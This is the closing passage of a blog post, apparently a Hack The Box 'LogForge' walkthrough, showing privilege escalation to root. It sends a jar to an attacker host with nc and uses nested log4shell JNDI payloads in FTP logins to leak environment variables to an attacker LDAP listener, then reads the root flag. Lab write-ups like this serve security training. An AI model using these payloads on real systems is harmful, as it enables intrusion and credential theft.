+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>tomcat@LogForge:/dev/shm$ nc -w 3 10.10.14.51 9001 &lt; ftpServer-1.0-SNAPSHOT-all.jar
+</span></span></code></pre></div><p>On my attack host</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -l -p <span style="color:#ae81ff">9001</span> &gt; ftp.jar
+</span></span></code></pre></div><p>If we open up the <code>jar</code> file, and navigate to the <code>Worker.class</code>, we can see that the password for the FTP server is an environment variable <code>ftp_password</code>
+<img src="/images/LogForge/env.png" alt="Environment"></p>
+<p>In order to get the environment variables, we have to exploit the <code>log4shell</code> vulnerability again. We are going to listen with <code>wireshark</code> and and use a nested <code>jndi</code>. If we start <code>wireshark</code> and listen on our VPN interface, then try to log into FTP on our shell, we should see the username in <code>wireshark</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>tomcat@LogForge:/var/log/tomcat9$ ftp localhost
+</span></span><span style="display:flex;"><span>Connected to localhost.
+</span></span><span style="display:flex;"><span>220 Welcome to the FTP-Server
+</span></span><span style="display:flex;"><span>Name (localhost:tomcat): ${jndi:ldap://10.10.14.51:1389/${env:ftp_user}}
+</span></span><span style="display:flex;"><span>530 Not logged in
+</span></span><span style="display:flex;"><span>Login failed.
+</span></span><span style="display:flex;"><span>Remote system type is FTP.
+</span></span></code></pre></div><p>In <code>wireshark</code> do a <code>tcp.port==1389</code> and then right click and Follow &gt; TCP Stream, we should see the username!
+<img src="/images/LogForged/user.png" alt="Username"></p>
+<p>Now we do the same for the password</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>Name (localhost:tomcat): ${jndi:ldap://10.10.14.51:1389/${env:ftp_password}}
+</span></span><span style="display:flex;"><span>530 Not logged in
+</span></span><span style="display:flex;"><span>Login failed.
+</span></span><span style="display:flex;"><span>Remote system type is FTP.
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>And we get back</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0....`........0....a.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>......0S...c1..log4j_env_leakage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>.............objectClass0...0...2.16.840.1.113730.3.4.20.....e..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>.&#34;.....Unable to perform the search because an error occurred while attempting to parse base DN &#39;log4j_env_leakage&#39;: The provided string could not be decoded as a DN because no equal sign was found after the RDN attribute &#39;log4j_env_leakage&#39;.0&#34;...B...0...2.16.840.1.113730.3.4.2
+</span></span></code></pre></div><p>The password is <code>log4j_env_leakage</code>! Now we can finally log into the FTP service and grab the root flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>tomcat@LogForge:/var/log/tomcat9$ ftp localhost
+</span></span><span style="display:flex;"><span>Connected to localhost.
+</span></span><span style="display:flex;"><span>220 Welcome to the FTP-Server
+</span></span><span style="display:flex;"><span>Name (localhost:tomcat): ippsec
+</span></span><span style="display:flex;"><span>331 User name okay, need password
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>230-Welcome to HKUST
+</span></span><span style="display:flex;"><span>230 User logged in successfully
+</span></span><span style="display:flex;"><span>Remote system type is FTP.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>200 Command OK
+</span></span><span style="display:flex;"><span>125 Opening ASCII mode data connection for file list.
+</span></span><span style="display:flex;"><span>.profile
+</span></span><span style="display:flex;"><span>.ssh
+</span></span><span style="display:flex;"><span>snap
+</span></span><span style="display:flex;"><span>ftpServer-1.0-SNAPSHOT-all.jar
+</span></span><span style="display:flex;"><span>.bashrc
+</span></span><span style="display:flex;"><span>.selected_editor
+</span></span><span style="display:flex;"><span>run.sh
+</span></span><span style="display:flex;"><span>.lesshst
+</span></span><span style="display:flex;"><span>.bash_history
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>.viminfo
+</span></span><span style="display:flex;"><span>.cache
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>ftp&gt; get root.txt
+</span></span><span style="display:flex;"><span>local: root.txt remote: root.txt
+</span></span><span style="display:flex;"><span>200 Command OK
+</span></span><span style="display:flex;"><span>150 Opening ASCII mode data connection for requested file root.txt
+</span></span><span style="display:flex;"><span>WARNING! 1 bare linefeeds received in ASCII mode
+</span></span><span style="display:flex;"><span>File may not have transferred correctly.
+</span></span><span style="display:flex;"><span>226 File transfer successful. Closing data connection.
+</span></span><span style="display:flex;"><span>33 bytes received in 0.00 secs (89.5182 kB/s)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>tomcat@LogForge:/var/log/tomcat9$ cat root.txt
+</span></span><span style="display:flex;"><span>9a61cd148dd358fef084ee597c1c18aa
+</span></span></code></pre></div>
+</content>
+<p>
+  
+  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
+  
+  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</footer>
+
+    
+</body>
+
+</html>
